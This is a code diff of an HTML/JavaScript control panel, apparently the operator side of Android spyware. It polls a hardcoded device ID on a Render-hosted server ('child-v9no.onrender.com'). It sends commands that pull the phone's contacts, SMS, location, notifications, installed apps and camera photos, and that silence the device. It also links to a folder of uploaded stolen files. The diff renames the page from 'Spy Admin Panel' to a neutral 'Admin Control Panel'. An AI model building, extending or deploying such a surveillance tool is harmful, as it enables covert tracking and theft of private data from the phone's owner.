@@ -3,257 +3,221 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spy Admin Panel</title>
+    <title>Admin Control Panel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #050505;
-            --card-bg: #111;
-            --text-main: #fff;
-            --accent: #00ff88; /* Hacker Green */
-            --danger: #ff3333;
-            --glass: rgba(255, 255, 255, 0.05);
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-main: #ffffff;
+            --text-muted: #aaaaaa;
+            --accent: #4caf50;
+            --offline: #ff4444;
         }
 
         body {
             background-color: var(--bg-color);
+            background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
             font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 20px;
             display: flex; justify-content: center;
-            min-height: 100vh;
         }
 
         .container {
-            width: 100%; max-width: 420px;
-            background: var(--card-bg);
-            border-radius: 20px; padding: 20px;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
-            border: 1px solid #333;
-        }
-
-        /* Input for ID */
-        .id-input-group {
-            display: flex; gap: 10px; margin-bottom: 20px;
-        }
-        input#targetId {
-            background: #222; border: 1px solid #444; color: var(--accent);
-            padding: 10px; border-radius: 10px; width: 100%; text-align: center;
-            font-weight: bold; letter-spacing: 1px;
+            width: 100%; max-width: 450px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 30px; padding: 20px;
+            border: 1px solid var(--glass-border);
         }
 
         /* Status Header */
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; }
+        
         .status-badge {
-            background: #1a1a1a; padding: 5px 12px; border-radius: 20px;
-            font-size: 0.8rem; display: flex; align-items: center; gap: 8px;
-            border: 1px solid #333;
+            background: #222; padding: 5px 12px; border-radius: 20px;
+            font-size: 0.75rem; display: flex; align-items: center; gap: 8px;
         }
-        .dot { height: 8px; width: 8px; border-radius: 50%; background: #555; }
-        .dot.online { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
-        .dot.offline { background: var(--danger); }
+        .dot { height: 10px; width: 10px; border-radius: 50%; background: #555; transition: 0.3s; }
+        .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
+        .dot.offline { background: var(--offline); box-shadow: 0 0 10px var(--offline); }
 
-        /* Info Cards */
-        .info-panel { display: flex; gap: 10px; margin-bottom: 15px; }
+        /* Info Panel */
+        .info-panel { display: flex; gap: 12px; margin-bottom: 20px; }
         .info-card {
-            flex: 1; background: var(--glass); padding: 10px;
-            border-radius: 12px; text-align: center; border: 1px solid #333;
+            flex: 1; background: var(--glass-bg); padding: 12px;
+            border-radius: 15px; border: 1px solid var(--glass-border);
         }
-        .label { font-size: 0.6rem; color: #888; text-transform: uppercase; }
-        .value { font-size: 0.9rem; font-weight: bold; margin-top: 5px; }
+        .label { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 5px; }
+        .value { font-size: 0.9rem; font-weight: 500; }
 
-        /* Battery */
-        .battery-sec { background: #1a1a1a; padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #333; }
-        .bat-bar { width: 100%; height: 8px; background: #333; border-radius: 5px; overflow: hidden; margin-top: 10px; }
-        .bat-fill { height: 100%; width: 0%; background: var(--accent); transition: 0.5s; }
+        /* Battery Section */
+        .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 20px; }
+        .battery-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem; }
+        .battery-bar-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; }
+        .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
 
         /* Grid Controls */
-        .controls-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .btn {
-            background: var(--glass); border-radius: 12px; padding: 15px;
-            display: flex; flex-direction: column; align-items: center; gap: 8px;
-            cursor: pointer; border: 1px solid #333; transition: 0.2s;
-            color: #ddd; text-decoration: none;
+        .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        .control-btn {
+            background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            border: 1px solid var(--glass-border); cursor: pointer;
+            transition: 0.2s; text-decoration: none; color: var(--text-main);
         }
-        .btn:hover { background: rgba(0, 255, 136, 0.1); border-color: var(--accent); color: var(--accent); }
-        .btn:active { transform: scale(0.95); }
-        .btn i { font-size: 1.4rem; }
-        .btn span { font-size: 0.7rem; }
+        .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
+        .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
+        .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
 
-        /* Toast Notification */
-        #toast {
-            visibility: hidden; min-width: 250px; background-color: #333; color: #fff;
-            text-align: center; border-radius: 5px; padding: 16px; position: fixed;
-            z-index: 1; left: 50%; bottom: 30px; transform: translateX(-50%);
-            border-left: 5px solid var(--accent);
+        /* Input Fix for ID */
+        #targetId {
+            background: transparent; border: none; color: white; font-weight: bold; width: 100px;
+            border-bottom: 1px solid #555; text-align: center;
         }
-        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
-        
-        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
-        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+
+        .fa-whatsapp { color: #25D366; } .fa-instagram { color: #E1306C; } .fa-location-dot { color: #ff4444; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="id-input-group">
-            <input type="text" id="targetId" value="M2103K19I" placeholder="Enter Device ID Here">
-        </div>
-
         <div class="header">
-            <div style="font-weight: bold; color: var(--accent);">
-                <i class="fa-brands fa-android"></i> <span id="modelName">Waiting...</span>
+            <div>
+                <i class="fa-solid fa-mobile-side"></i>
+                <input type="text" id="targetId" value="M2103K19I">
             </div>
             <div class="status-badge">
                 <span id="statusDot" class="dot"></span>
-                <span id="statusText">Disconnected</span>
+                <span id="statusText">Connecting...</span>
             </div>
         </div>
 
         <div class="info-panel">
             <div class="info-card">
-                <div class="label">Battery</div>
-                <div class="value" id="batLevel">--%</div>
+                <div class="label">ANDROID</div>
+                <div id="androidVer" class="value">--</div>
             </div>
             <div class="info-card">
-                <div class="label">Version</div>
-                <div class="value" id="androidVer">--</div>
-            </div>
-            <div class="info-card">
-                <div class="label">Last Seen</div>
-                <div class="value" id="lastSeen">--:--</div>
+                <div class="label">NETWORK</div>
+                <div id="networkType" class="value">Searching...</div>
             </div>
         </div>
 
-        <div class="battery-sec">
-            <div style="display:flex; justify-content:space-between; font-size:0.8rem;">
-                <span style="color:#888;">Power Status</span>
-                <span id="chargingStatus" style="color:var(--text-main);">Unknown</span>
+        <div class="battery-details">
+            <div class="battery-header">
+                <span class="label">BATTERY LEVEL</span>
+                <span id="batteryPercent" class="value">0%</span>
             </div>
-            <div class="bat-bar">
-                <div id="batFill" class="bat-fill"></div>
+            <div class="battery-bar-bg">
+                <div id="batteryFill" class="battery-bar-fill"></div>
             </div>
+            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting for data...</div>
         </div>
 
         <div class="controls-grid">
-            <div class="btn" onclick="sendCommand('contacts')">
-                <i class="fa-solid fa-address-book" style="color: #4facfe;"></i>
-                <span>Get Contacts</span>
-            </div>
+            <div class="control-btn" onclick="sendCommand('camera')"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
+            <div class="control-btn" onclick="sendCommand('location')"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
+            <div class="control-btn" onclick="sendCommand('notifications')"><i class="fa-regular fa-message"></i><span>Notify</span></div>
             
-            <div class="btn" onclick="sendCommand('sms')">
-                <i class="fa-solid fa-comments" style="color: #f093fb;"></i>
-                <span>Get SMS</span>
+            <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
+                <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
             </div>
+
+            <div class="control-btn" onclick="sendCommand('contacts')"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
+            <div class="control-btn" onclick="sendCommand('sms')"><i class="fa-solid fa-comments"></i><span>SMS</span></div>
             
-            <div class="btn" onclick="sendCommand('location')">
-                <i class="fa-solid fa-location-dot" style="color: #ff6b6b;"></i>
-                <span>Get Location</span>
-            </div>
-
-            <div class="btn" onclick="sendCommand('notifications')">
-                <i class="fa-solid fa-bell" style="color: #ffd200;"></i>
-                <span>Get Notifs</span>
-            </div>
-
-            <div class="btn" onclick="sendCommand('camera')">
-                <i class="fa-solid fa-camera" style="color: #00ff88;"></i>
-                <span>Take Photo</span>
-            </div>
-
-            <div class="btn" onclick="openUploads()">
-                <i class="fa-solid fa-folder-open"></i>
-                <span>View Files</span>
-            </div>
+            <a href="https://child-v9no.onrender.com/uploads/" target="_blank" class="control-btn">
+                <i class="fa-solid fa-folder-open"></i><span>Files</span>
+            </a>
+            
+            <div class="control-btn" onclick="sendCommand('apps')"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>
         </div>
     </div>
 
-    <div id="toast">Command Sent Successfully!</div>
-
     <script>
-        const API_URL = "https://child-v9no.onrender.com/api"; // Tumhara Render URL
+        // ⚠️ TUMHARA SERVER URL
+        const BASE_URL = "https://child-v9no.onrender.com/api";
 
-        // 1. Status Check Loop (Har 3 sec)
-        setInterval(checkStatus, 3000);
+        // --- REAL-TIME DATA FETCHING ---
+        function updateDashboard() {
+            // ID Input box se uthayega
+            const deviceId = document.getElementById('targetId').value;
 
-        async function checkStatus() {
-            const id = document.getElementById('targetId').value;
-            if(!id) return;
+            fetch(`${BASE_URL}/device-status/${deviceId}`)
+                .then(res => res.json())
+                .then(data => {
+                    // Update Android Version
+                    document.getElementById('androidVer').innerText = "V" + (data.version || "--");
+                    
+                    // Update Connection Status
+                    const dot = document.getElementById('statusDot');
+                    const statusText = document.getElementById('statusText');
+                    
+                    if(data.isOnline) {
+                        dot.className = "dot online";
+                        statusText.innerText = "Connected";
+                        document.getElementById('networkType').innerText = "Online";
+                        statusText.style.color = "#4caf50";
+                    } else {
+                        dot.className = "dot offline";
+                        statusText.innerText = "Disconnected";
+                        document.getElementById('networkType').innerText = "Offline";
+                        statusText.style.color = "#ff4444";
+                    }
 
-            try {
-                const res = await fetch(`${API_URL}/device-status/${id}`);
-                const data = await res.json();
+                    // Update Battery
+                    const battery = data.battery || 0;
+                    document.getElementById('batteryPercent').innerText = battery + "%";
+                    document.getElementById('batteryFill').style.width = battery + "%";
+                    document.getElementById('batteryStatus').innerText = data.charging ? "Charging ⚡" : "Discharging";
+                    
+                    // Battery Color change
+                    document.getElementById('batteryFill').style.background = battery < 20 ? "#ff4444" : "#4caf50";
+                })
+                .catch(err => console.log("Waiting for server..."));
+        }
 
-                // UI Update
-                document.getElementById('modelName').innerText = data.model || id;
-                document.getElementById('androidVer').innerText = data.version || "--";
-                document.getElementById('batLevel').innerText = (data.battery || 0) + "%";
-                document.getElementById('batFill').style.width = (data.battery || 0) + "%";
-                
-                // Last Seen Time
-                if(data.lastSeen) {
-                    const date = new Date(data.lastSeen);
-                    document.getElementById('lastSeen').innerText = date.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-                }
+        // Poll server every 3 seconds for updates
+        setInterval(updateDashboard, 3000);
 
-                // Online/Offline Dot
-                const dot = document.getElementById('statusDot');
-                const txt = document.getElementById('statusText');
-                if(data.isOnline) {
-                    dot.className = "dot online";
-                    txt.innerText = "Online";
-                    txt.style.color = "#00ff88";
+        // Sound Mode Switcher
+        let currentMode = 0;
+        function cycleSoundMode() {
+            const icon = document.getElementById('soundIcon');
+            const text = document.getElementById('soundText');
+            currentMode = (currentMode + 1) % 3;
+            if(currentMode === 0) { icon.className = "fa-solid fa-bell"; text.innerText = "Normal"; sendCommand('ring'); }
+            else if(currentMode === 1) { icon.className = "fa-solid fa-vibration"; text.innerText = "Vibrate"; sendCommand('vibrate'); }
+            else { icon.className = "fa-solid fa-bell-slash"; text.innerText = "Silent"; sendCommand('silent'); }
+        }
+
+        // --- COMMAND SENDING FUNCTION (FIXED) ---
+        function sendCommand(action) {
+            const deviceId = document.getElementById('targetId').value;
+            const statusText = document.getElementById('statusText');
+
+            statusText.innerText = "Sending...";
+            
+            fetch(`${BASE_URL}/send-command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: deviceId, command: action })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.status === 'success'){
+                    alert("✅ Command Sent: " + action); // Simple popup alert
+                    statusText.innerText = "Sent!";
                 } else {
-                    dot.className = "dot offline";
-                    txt.innerText = "Offline";
-                    txt.style.color = "#ff3333";
+                    alert("Error: " + data.message);
                 }
-
-                document.getElementById('chargingStatus').innerText = data.charging ? "⚡ Charging" : "On Battery";
-
-            } catch (e) {
-                console.log("Server error or connecting...");
-            }
+            })
+            .catch(err => {
+                alert("Server Error! Kya Render ki link khuli hai?");
+            });
         }
-
-        // 2. Send Command Function
-        async function sendCommand(cmd) {
-            const id = document.getElementById('targetId').value;
-            showToast(`🚀 Sending: ${cmd}...`);
-
-            try {
-                const res = await fetch(`${API_URL}/send-command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: id, command: cmd })
-                });
-                const result = await res.json();
-                
-                if(result.status === "success") {
-                    showToast(`✅ Sent! Wait for data.`);
-                } else {
-                    showToast(`❌ Error: ${result.message}`);
-                }
-            } catch (e) {
-                showToast("❌ Server Disconnected");
-            }
-        }
-
-        // 3. View Files Folder
-        function openUploads() {
-            window.open("https://child-v9no.onrender.com/uploads/", "_blank");
-        }
-
-        // 4. Popup Helper
-        function showToast(msg) {
-            const x = document.getElementById("toast");
-            x.innerText = msg;
-            x.className = "show";
-            setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
-        }
-
-        // Run once on load
-        checkStatus();
     </script>
 </body>
 </html>
